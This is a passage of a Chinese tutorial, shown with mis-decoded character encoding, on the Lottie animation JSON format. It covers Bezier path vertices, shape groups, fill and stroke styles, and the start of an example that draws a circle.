<p>è‡ªç”±è·¯å¾„ï¼ˆ<code>ty: â€˜shâ€˜</code>ï¼‰æ˜¯æœ€åŸºç¡€ã€æœ€çµæ´»çš„å½¢çŠ¶å…ƒç´ ã€‚å…¶æ ¸å¿ƒæ•°æ®å­˜å‚¨åœ¨Â <code>ks</code>Â å±æ€§ä¸­ï¼Œå®ƒå®šä¹‰äº†ä¸€ç³»åˆ—<strong>é¡¶ç‚¹ï¼ˆVertexï¼‰</strong> Â ä»¥åŠè¿æ¥è¿™äº›é¡¶ç‚¹çš„<strong>è´å¡å°”æ›²çº¿</strong>ã€‚</p>
<p>ä¸€ä¸ªè·¯å¾„çš„å…³é”®å¸§æ•°æ®é€šå¸¸åŒ…å«ä»¥ä¸‹å­—æ®µï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  â€œaâ€<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// è¡¨ç¤ºè·¯å¾„æ•°æ®æ˜¯åŠ¨ç”»çš„</span>
  â€œkâ€<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    â€œiâ€<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// å…¥æ§åˆ¶ç‚¹ (In Tangent)</span>
    â€œoâ€<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// å‡ºæ§åˆ¶ç‚¹ (Out Tangent)</span>
    â€œvâ€<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">50</span><span class="hljs-punctuation">,</span> <span class="hljs-number">50</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// é¡¶ç‚¹ (Vertex)</span>
    â€œcâ€<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// è·¯å¾„æ˜¯å¦é—­åˆ (Closed)</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>v</code>Â (é¡¶ç‚¹)</strong> ï¼šä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œå®šä¹‰äº†è·¯å¾„åœ¨ç©ºé—´ä¸­ç»è¿‡çš„å…³é”®ç‚¹åæ ‡Â <code>[x, y]</code>ã€‚</li>
<li><strong><code>i</code>Â (å…¥æ§åˆ¶ç‚¹)</strong> ï¼šå®šä¹‰æ›²çº¿<strong>è¿›å…¥</strong>å½“å‰é¡¶ç‚¹æ—¶çš„æ–¹å‘ä¸å¼ åŠ›ã€‚</li>
<li><strong><code>o</code>Â (å‡ºæ§åˆ¶ç‚¹)</strong> ï¼šå®šä¹‰æ›²çº¿<strong>ç¦»å¼€</strong>å½“å‰é¡¶ç‚¹æ—¶çš„æ–¹å‘ä¸å¼ åŠ›ã€‚</li>
<li><strong><code>c</code>Â (é—­åˆ)</strong> ï¼šå¸ƒå°”å€¼ï¼Œ<code>true</code>Â è¡¨ç¤ºè·¯å¾„çš„é¦–å°¾é¡¶ç‚¹åº”è¿æ¥ï¼Œå½¢æˆå°é—­å›¾å½¢ã€‚</li>
</ul>
<p><strong>å·¥ä½œåŸç†</strong>ï¼š<code>v</code>Â å®šä¹‰äº†â€œéª¨æ¶â€ï¼Œ<code>i</code>Â å’ŒÂ <code>o</code>Â åˆ™å®šä¹‰äº†è¿æ¥éª¨æ¶çš„â€œè‚Œè‚‰â€æ›²çº¿ã€‚é€šè¿‡ä¸ºè¿™äº›æ•°æ®æ·»åŠ å…³é”®å¸§ï¼Œå³å¯å®ç°è·¯å¾„çš„å½¢å˜ã€ç»˜åˆ¶ç­‰å¤æ‚åŠ¨ç”»ã€‚</p>
<blockquote>
<p><strong>çŸ¥è¯†å…³è”ï¼šä¸¤ç§è´å¡å°”æ›²çº¿</strong><br/>
æ‚¨å¯èƒ½å·²ç»å‘ç°ï¼Œè¿™é‡Œçš„Â <code>i</code>Â å’ŒÂ <code>o</code>Â ä¸ç¬¬å››ç« <strong>å…³é”®å¸§ç¼“åŠ¨</strong>ä¸­çš„Â <code>i</code>Â å’ŒÂ <code>o</code>Â å­—æ®µåŒåï¼Œä¸”éƒ½ä»£è¡¨è´å¡å°”æ›²çº¿çš„æ§åˆ¶ç‚¹ã€‚è¿™æ˜¯ Lottie ä¸­è´å¡å°”æ›²çº¿çš„ä¸¤ç§æ ¸å¿ƒåº”ç”¨ï¼š</p>






























<table><thead><tr><th>ç»´åº¦</th><th><strong>ç©ºé—´è´å¡å°”æ›²çº¿ (æœ¬ç« )</strong></th><th><strong>æ—¶é—´è´å¡å°”æ›²çº¿ (ç¬¬å››ç« )</strong></th></tr></thead><tbody><tr><td><strong>ä½œç”¨</strong></td><td>å®šä¹‰<strong>ç©ºé—´ä¸­</strong>çš„å›¾å½¢<strong>å½¢çŠ¶</strong>ã€‚</td><td>å®šä¹‰<strong>æ—¶é—´ä¸Š</strong>çš„å±æ€§<strong>å˜åŒ–é€Ÿç‡</strong>ï¼ˆç¼“åŠ¨ï¼‰ã€‚</td></tr><tr><td><strong>æ§åˆ¶ç‚¹ (<code>i</code>/<code>o</code>)</strong></td><td>æ§åˆ¶é¡¶ç‚¹å¤„æ›²çº¿çš„<strong>æ–¹å‘ä¸æ›²ç‡</strong>ï¼Œå†³å®šè·¯å¾„å½¢æ€ã€‚</td><td>æ§åˆ¶å…³é”®å¸§å¤„åŠ¨ç”»<strong>é€Ÿåº¦çš„å¿«æ…¢</strong>ï¼Œå†³å®šè¿åŠ¨èŠ‚å¥ã€‚</td></tr><tr><td><strong>åæ ‡ç©ºé—´</strong></td><td>ä½äºç”»å¸ƒçš„<strong>äºŒç»´/ä¸‰ç»´ç©ºé—´</strong>Â (å¦‚Â <code>[x, y]</code>)ã€‚</td><td>ä½äº<strong>æ—¶é—´-è¿›åº¦äºŒç»´ç©ºé—´</strong>ï¼ŒXè½´æ˜¯æ—¶é—´(0-1)ï¼ŒYè½´æ˜¯è¿›åº¦(0-1)ã€‚</td></tr><tr><td><strong>ç›´è§‚æ„Ÿå—</strong></td><td>æ‹–æ‹½æ§åˆ¶æŸ„ï¼Œæ”¹å˜çš„æ˜¯<strong>çº¿çš„å¼¯æ›²ç¨‹åº¦</strong>ã€‚</td><td>æ‹–æ‹½æ§åˆ¶æŸ„ï¼Œæ”¹å˜çš„æ˜¯<strong>åŠ¨ç”»çš„å…ˆå¿«åæ…¢</strong>ã€‚</td></tr></tbody></table>
<p><strong>åº•å±‚ä¸€è‡´æ€§</strong>ï¼šå°½ç®¡åº”ç”¨ä¸åŒï¼Œä½†ä¸¤è€…éƒ½åŸºäº<strong>ä¸‰æ¬¡è´å¡å°”æ›²çº¿</strong>çš„æ•°å­¦æ¨¡å‹ã€‚ç†è§£è¿™ä¸€ç‚¹åï¼Œæ— è®ºæ˜¯è°ƒæ•´è·¯å¾„å¹³æ»‘åº¦è¿˜æ˜¯åŠ¨ç”»ç¼“åŠ¨ï¼Œæ‚¨æ“ä½œçš„éƒ½æ˜¯åŒä¸€ç§â€œæ§åˆ¶ç‚¹â€é€»è¾‘ã€‚è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä½•å¯è§†åŒ–å·¥å…·Â <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcubic-bezier.com%2F" target="_blank" title="https://cubic-bezier.com/" ref="nofollow noopener noreferrer">cubic-bezier.com</a></strong>Â å¯¹ç†è§£ä¸¤è€…éƒ½æœ‰å¸®åŠ©ï¼šè™½ç„¶å®ƒä¸»è¦ç”¨äºç¼“åŠ¨ï¼ˆæ—¶é—´ï¼‰ï¼Œä½†å…¶å¯¹æ›²çº¿å½¢æ€çš„ç›´è§‚å±•ç¤ºï¼ŒåŒæ ·æœ‰åŠ©äºæ‚¨æƒ³è±¡ç©ºé—´è·¯å¾„ä¸­æ§åˆ¶ç‚¹å¯¹å½¢çŠ¶çš„å½±å“ã€‚</p>
</blockquote>
<h3 data-id="heading-28"><strong>å½¢çŠ¶ç»„ï¼ˆ<code>gr</code>ï¼‰ï¼šåµŒå¥—ä¸ç»„ç»‡</strong></h3>
<p>ä¸ºäº†ç®¡ç†å¤æ‚çš„å›¾å½¢ï¼ŒLottie å¼•å…¥äº†Â <strong>å½¢çŠ¶ç»„ï¼ˆ<code>ty: â€˜grâ€˜</code>ï¼‰</strong> ã€‚ç»„å¯ä»¥å°†å¤šä¸ªå½¢çŠ¶å…ƒç´ ï¼ˆåŒ…æ‹¬å…¶ä»–ç»„ï¼‰æ‰“åŒ…ä¸ºä¸€ä¸ªé€»è¾‘æ•´ä½“ã€‚</p>
<ul>
<li>
<p><strong><code>it</code>Â æ•°ç»„</strong>ï¼šç»„çš„æ ¸å¿ƒå±æ€§ï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºåŒ…å«å…¶å­å…ƒç´ ï¼ˆå¦‚è·¯å¾„ã€å¡«å……ã€æè¾¹æˆ–å…¶ä»–ç»„ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä½œç”¨</strong>ï¼š</p>
<ol>
<li><strong>å±‚æ¬¡åŒ–ç®¡ç†</strong>ï¼šåƒæ–‡ä»¶å¤¹ä¸€æ ·ç»„ç»‡å›¾å½¢ï¼Œä½¿ç»“æ„æ¸…æ™°ã€‚</li>
<li><strong>ç»Ÿä¸€å˜æ¢</strong>ï¼šç»„å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„Â <code>ks</code>ï¼ˆå˜æ¢ï¼‰å±æ€§ã€‚å¯¹è¯¥ç»„åº”ç”¨çš„å˜æ¢ï¼ˆå¦‚ç§»åŠ¨ã€ç¼©æ”¾ï¼‰ä¼šåŒæ—¶å½±å“å…¶å†…éƒ¨æ‰€æœ‰å­å…ƒç´ ã€‚</li>
<li><strong>åŠ¨ç”»å¤ç”¨</strong>ï¼šé€šè¿‡æ§åˆ¶ç»„çš„å˜æ¢ï¼Œå¯ä»¥è½»æ¾å®ç°æ•´ä¸ªå›¾å½¢æ¨¡å—çš„åŠ¨ç”»ã€‚</li>
</ol>
</li>
</ul>
<hr/>
<h2 data-id="heading-29"><strong>å…­ã€å½¢çŠ¶æ ·å¼ - å¡«å……ä¸æè¾¹</strong></h2>
<p>åœ¨ä¸Šä¸€ç« ä¸­ï¼Œæˆ‘ä»¬æ¢ç´¢äº†å½¢çŠ¶å›¾å±‚å¦‚ä½•é€šè¿‡è·¯å¾„ã€æ¤­åœ†ã€çŸ©å½¢ç­‰å…ƒç´ å®šä¹‰å›¾å½¢çš„<strong>å‡ ä½•éª¨æ¶</strong>ã€‚ç„¶è€Œï¼Œåªæœ‰å‡ ä½•å½¢çŠ¶æ˜¯â€œä¸å¯è§â€çš„ã€‚è¦è®©å›¾å½¢çœŸæ­£è¢«æ¸²æŸ“å‡ºæ¥ï¼Œå°±éœ€è¦ä¸ºå…¶èµ‹äºˆ<strong>æ ·å¼</strong>ã€‚</p>
<p>æœ¬ç« å°†ä»‹ç»å½¢çŠ¶ç³»ç»Ÿä¸­è´Ÿè´£è§†è§‰å‘ˆç°çš„ä¸¤å¤§æ ¸å¿ƒæ ·å¼å…ƒç´ ï¼š<strong>å¡«å……ï¼ˆFillï¼‰</strong> Â ä¸<strong>æè¾¹ï¼ˆStrokeï¼‰</strong> ã€‚å®ƒä»¬ä¸ºå½¢çŠ¶çš„<strong>å†…éƒ¨</strong>å’Œ<strong>è½®å»“</strong>æä¾›é¢œè‰²ã€æ¸å˜å’Œä¸é€æ˜åº¦ç­‰è§†è§‰æ•ˆæœï¼Œæ˜¯çŸ¢é‡å›¾å½¢ä»â€œçº¿æ¡†â€å˜ä¸ºâ€œç”»é¢â€çš„å…³é”®ã€‚</p>
<h3 data-id="heading-30"><strong>6.1 æ ·å¼çš„ä½œç”¨ï¼šè®©å½¢çŠ¶å¯è§</strong></h3>
<p>åœ¨Â <code>shapes</code>Â æ•°ç»„ä¸­ï¼Œæ ·å¼å…ƒç´ ï¼ˆå¦‚Â <code>fl</code>ã€<code>st</code>ï¼‰ä¸å½¢çŠ¶å…ƒç´ ï¼ˆå¦‚Â <code>sh</code>ã€<code>el</code>ï¼‰åœ°ä½å¹³ç­‰ï¼Œé€šè¿‡<strong>æ¸²æŸ“é¡ºåº</strong>ç›¸äº’ç»“åˆã€‚</p>
<ul>
<li><strong>å †å è§„åˆ™</strong>ï¼š<code>it</code>Â æ•°ç»„ä¸­çš„å…ƒç´ <strong>æŒ‰ç´¢å¼•é¡ºåºä¾æ¬¡ç»˜åˆ¶</strong>ã€‚è¿™æ„å‘³ç€ç´¢å¼•æ›´å¤§çš„å…ƒç´ ï¼ˆåç»˜åˆ¶çš„ï¼‰ä¼šå åŠ åœ¨ç´¢å¼•æ›´å°çš„å…ƒç´ ï¼ˆå…ˆç»˜åˆ¶çš„ï¼‰ä¹‹ä¸Šã€‚åœ¨å›¾å½¢æ„å»ºä¸­ï¼Œé€šå¸¸å…ˆå®šä¹‰"å½¢çŠ¶"å…ƒç´ ï¼ˆå¦‚Â <code>el</code>,Â <code>sh</code>ï¼‰ï¼Œå†å®šä¹‰ä¸ºå…¶ç€è‰²çš„"æ ·å¼"å…ƒç´ ï¼ˆå¦‚Â <code>fl</code>,Â <code>st</code>ï¼‰ã€‚</li>
<li><strong>ç‹¬ç«‹æ€§ä¸ç»„åˆæ€§</strong>ï¼šæ ·å¼å…ƒç´ æ˜¯ç‹¬ç«‹çš„ï¼Œå¯ä»¥è‡ªç”±ç»„åˆã€‚ä¸€ä¸ªå½¢çŠ¶å¯ä»¥åŒæ—¶æ‹¥æœ‰å¡«å……å’Œæè¾¹ï¼Œä¹Ÿå¯ä»¥åªæœ‰å…¶ä¸­ä¸€ç§ã€‚å®ƒä»¬å…±åŒé™„ç€äºå…¶ä¸Šæ–¹æœ€è¿‘ä¸”æœªé—­åˆçš„å›¾å½¢å…ƒç´ æˆ–ç»„ã€‚</li>
</ul>
<h3 data-id="heading-31"><strong>å¡«å……ï¼ˆFillï¼‰ï¼šçº¯è‰²ä¸æ¸å˜</strong></h3>
<p>å¡«å……ç”¨äºä¸ºå½¢çŠ¶çš„å†…éƒ¨åŒºåŸŸç€è‰²ã€‚Lottie æ”¯æŒä¸¤ç§å¡«å……ç±»å‹ã€‚</p>
<h4 data-id="heading-32"><strong>çº¯è‰²å¡«å……ï¼ˆ<code>ty</code>: 'fl'ï¼‰</strong></h4>
<p>è¿™æ˜¯æœ€åŸºç¡€çš„å¡«å……ç±»å‹ï¼Œä½¿ç”¨å•ä¸€é¢œè‰²ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fl"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç±»å‹ï¼šFill (çº¯è‰²å¡«å……)</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>      <span class="hljs-comment">// Color (é¢œè‰²)</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.6</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// RGBA æ•°ç»„ï¼Œå€¼èŒƒå›´ 0-1</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span> <span class="hljs-comment">// Opacity (ä¸é€æ˜åº¦)</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-33"><strong>æ¸å˜å¡«å……ï¼ˆ<code>ty</code>: 'gf'ï¼‰</strong></h4>
<p>Lottie æ”¯æŒçº¿æ€§æ¸å˜å’Œå¾„å‘æ¸å˜ï¼Œä¸ºå¡«å……å¸¦æ¥ä¸°å¯Œçš„è‰²å½©è¿‡æ¸¡ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"gf"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç±»å‹ï¼šGradient Fill (æ¸å˜å¡«å……)</span>
  <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// æ¸å˜ç±»å‹ï¼š1-çº¿æ€§ï¼Œ2-å¾„å‘</span>
  <span class="hljs-attr">"g"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"p"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.6</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// èµ·ç‚¹ (çº¿æ€§) / èµ·å§‹ç‚¹ (å¾„å‘)</span>
  <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span>  <span class="hljs-comment">// ç»ˆç‚¹ (çº¿æ€§) / ç»“æŸç‚¹ (å¾„å‘)</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>g</code>Â å¯¹è±¡</strong>ï¼šæ˜¯æ¸å˜çš„æ ¸å¿ƒã€‚<code>p</code>Â å®šä¹‰è‰²æ ‡æ•°é‡ï¼Œ<code>k</code>Â æ˜¯ä¸€ä¸ªæ‰å¹³çš„æ•°ç»„ï¼Œæ¯ 5 ä¸ªæ•°å­—ä¸ºä¸€ç»„ï¼Œè¡¨ç¤ºä¸€ä¸ªè‰²æ ‡çš„Â <code>[ä½ç½®, R, G, B, A]</code>ã€‚æ‰€æœ‰è‰²æ ‡æ•°æ®æŒ‰é¡ºåºè¿æ¥ã€‚</li>
</ul>
<h3 data-id="heading-34"><strong>æè¾¹ï¼ˆStrokeï¼‰ï¼šè½®å»“ä¸æ ·å¼</strong></h3>
<p>æè¾¹ç”¨äºç»˜åˆ¶å½¢çŠ¶çš„è½®å»“çº¿ã€‚å®ƒæ‹¥æœ‰æ¯”å¡«å……æ›´ä¸°å¯Œçš„å±æ€§æ¥æ§åˆ¶çº¿æ¡çš„è§†è§‰è¡¨ç°ã€‚</p>
<h4 data-id="heading-35"><strong>çº¯è‰²æè¾¹ï¼ˆ<code>ty</code>: 'st'ï¼‰</strong></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"st"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç±»å‹ï¼šStroke (æè¾¹)</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// é¢œè‰²ï¼ŒåŒå¡«å……</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>      <span class="hljs-comment">// Width (çº¿å®½)</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span>    <span class="hljs-comment">// çº¿å®½ä¸º5åƒç´ </span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"lc"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// Line Cap (çº¿å¸½): 1-å¹³å¤´, 2-åœ†å¤´, 3-æ–¹å¤´</span>
  <span class="hljs-attr">"lj"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// Line Join (è¿æ¥): 1-æ–œæ¥, 2-åœ†è§’, 3-æ–œé¢</span>
  <span class="hljs-attr">"ml"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// Miter Limit (æ–œæ¥é™åˆ¶)</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span> <span class="hljs-comment">// ä¸é€æ˜åº¦</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>w</code>Â (Width)</strong> ï¼šæè¾¹çš„ç²—ç»†ï¼Œæ”¯æŒåŠ¨ç”»ã€‚</li>
<li><strong><code>lc</code>Â (Line Cap)</strong> ï¼šå®šä¹‰çº¿æ®µç«¯ç‚¹çš„æ ·å¼ã€‚</li>
<li><strong><code>lj</code>Â (Line Join)</strong> ï¼šå®šä¹‰çº¿æ®µè½¬æŠ˜å¤„çš„è¿æ¥æ ·å¼ã€‚</li>
<li><strong><code>ml</code>Â (Miter Limit)</strong> ï¼šå½“Â <code>lj</code>Â ä¸º 1 (æ–œæ¥) æ—¶ï¼Œæ§åˆ¶æ–œæ¥é•¿åº¦ä¸çº¿å®½çš„æ¯”ä¾‹ä¸Šé™ï¼Œé˜²æ­¢å°–è§’è¿‡é•¿ã€‚</li>
</ul>
<h4 data-id="heading-36"><strong>æ¸å˜æè¾¹ï¼ˆ<code>ty</code>: 'gs'ï¼‰</strong></h4>
<p>æ¸å˜æè¾¹çš„æ•°æ®ç»“æ„ä¸æ¸å˜å¡«å…… (<code>gf</code>) é«˜åº¦ç›¸ä¼¼ï¼ŒåŒ…å«Â <code>t</code>Â (ç±»å‹)ã€<code>g</code>Â (æ¸å˜æ•°æ®) ç­‰å±æ€§ï¼ŒåŒºåˆ«åœ¨äºå®ƒåº”ç”¨äºè½®å»“çº¿è€Œéå¡«å……åŒºåŸŸã€‚</p>
<h3 data-id="heading-37"><strong>æ ·å¼çš„é€šç”¨å±æ€§</strong></h3>
<p>å¡«å……å’Œæè¾¹å…±äº«ä¸€äº›æ§åˆ¶å…¶æœ€ç»ˆå‘ˆç°æ•ˆæœçš„é€šç”¨å±æ€§ï¼š</p>




















<table><thead><tr><th>å±æ€§</th><th>ç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td><strong><code>o</code></strong></td><td><code>object</code></td><td><strong>ä¸é€æ˜åº¦ (Opacity)</strong> ã€‚é€šè¿‡Â <code>a</code>Â å’ŒÂ <code>k</code>Â æ§åˆ¶ï¼Œ<strong>å€¼èŒƒå›´ä¸º 0 åˆ° 100</strong>ï¼ˆ100 ä¸ºå®Œå…¨ä¸é€æ˜ï¼‰ã€‚è¿™ä¸ CSS ä¸­ 0-1 çš„èŒƒå›´ä¸åŒï¼Œè¯·æ³¨æ„åŒºåˆ†ã€‚</td></tr><tr><td><strong><code>bm</code></strong></td><td><code>number</code></td><td><strong>æ··åˆæ¨¡å¼ (Blend Mode)</strong> ã€‚å®šä¹‰å½“å‰æ ·å¼å¦‚ä½•ä¸ä¸‹æ–¹å·²æœ‰çš„åƒç´ è¿›è¡Œæ··åˆã€‚å¸¸è§å€¼ï¼š<code>0</code>Â (æ­£å¸¸)ã€<code>1</code>Â (ç›¸ä¹˜)ã€<code>2</code>Â (å±å¹•) ç­‰ï¼Œå¯¹åº” After Effects ä¸­çš„æ··åˆæ¨¡å¼ã€‚</td></tr></tbody></table>
<h3 data-id="heading-38">ğŸ¨å°è¯•ç‰›åˆ€ï¼šç”»ä¸ªåœ†</h3>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬ç»¼åˆè¿ç”¨ä»¥ä¸Šæ¦‚å¿µï¼Œåˆ›å»ºä¸€ä¸ªæœ€ç®€å•çš„å½¢çŠ¶ï¼š<strong>ä¸€ä¸ªè“è‰²çš„å®å¿ƒåœ†</strong>ã€‚æˆ‘ä»¬å°†é€šè¿‡ JSON é…ç½®ï¼Œæ¸…æ™°åœ°å±•ç¤ºå½¢çŠ¶å›¾å±‚çš„Â <code>shapes</code>Â æ•°ç»„æ˜¯å¦‚ä½•ç»„ç»‡èµ·æ¥çš„ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5733db6d3a25461f92ca58eb48742101~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=atYsH7mr0D%2BItQkxiTEoGqbKwpk%3D" alt="image.png" width="50%" loading="lazy"/></p>
<p>ä»¥ä¸‹æ˜¯å®ç°è¯¥åœ†å½¢çš„<strong>ç²¾ç®€ç‰ˆ JSON é…ç½®</strong>ï¼Œæˆ‘ä»¬çœç•¥äº†å‰é¢ç« èŠ‚å·²è¯¦ç»†è®²è§£çš„é€šç”¨å›¾å±‚å±æ€§ï¼ˆå¦‚Â <code>ks</code>Â å˜æ¢ï¼‰ï¼Œå°†ç„¦ç‚¹å®Œå…¨æ”¾åœ¨å½¢çŠ¶å›¾å±‚ç‰¹æœ‰çš„Â <code>shapes</code>Â æ•°ç»„ä¸Šï¼š</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,
  <span class="hljs-string">"layers"</span>: [
    {
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">4</span>, <span class="hljs-comment">// â­ï¸ æ ¸å¿ƒæ ‡è¯†ï¼šè¿™æ˜¯ä¸€ä¸ªå½¢çŠ¶å›¾å±‚</span>
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"å¸¦æè¾¹åœ†å½¢"</span>,
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-comment">// ğŸ”½ æ­¤å¤„çœç•¥äº†å›¾å±‚çš„ `ks` å˜æ¢å±æ€§ï¼ˆå¦‚ p, a, s, r, oï¼‰</span>
      <span class="hljs-comment">// åœ¨å®Œæ•´æ–‡ä»¶ä¸­ï¼Œå®ƒä»¬ç”¨äºå°†æ•´ä¸ªå›¾å±‚å®šä½åœ¨ç”»å¸ƒä¸­å¿ƒï¼Œä¾‹å¦‚ï¼š</span>
      <span class="hljs-comment">// "ks": { "p": { "a": 0, "k": [400, 300, 0] }, ... }</span>
      
      <span class="hljs-string">"shapes"</span>: [ <span class="hljs-comment">// â­ï¸ æœ¬ç« æ ¸å¿ƒï¼šå½¢çŠ¶ä¸æ ·å¼æ•°ç»„</span>
        {
          <span class="hljs-string">"ty"</span>: <span class="hljs-string">"gr"</span>, <span class="hljs-comment">// ç±»å‹ï¼šgr (Group)ï¼Œä¸€ä¸ªå½¢çŠ¶ç»„</span>
          <span class="hljs-string">"nm"</span>: <span class="hljs-string">"åœ†å½¢ç»„"</span>,
          <span class="hljs-string">"it"</span>: [ <span class="hljs-comment">// ç»„å†…å…ƒç´ åˆ—è¡¨ï¼ŒæŒ‰ç´¢å¼•é¡ºåº 0â†’1â†’2â†’3 æ¸²æŸ“</span>
            <span class="hljs-comment">// 1. å½¢çŠ¶å®šä¹‰ï¼šæ¤­åœ† (el) - å…ˆç»˜åˆ¶ï¼Œå®šä¹‰å‡ ä½•è½®å»“</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"el"</span>,
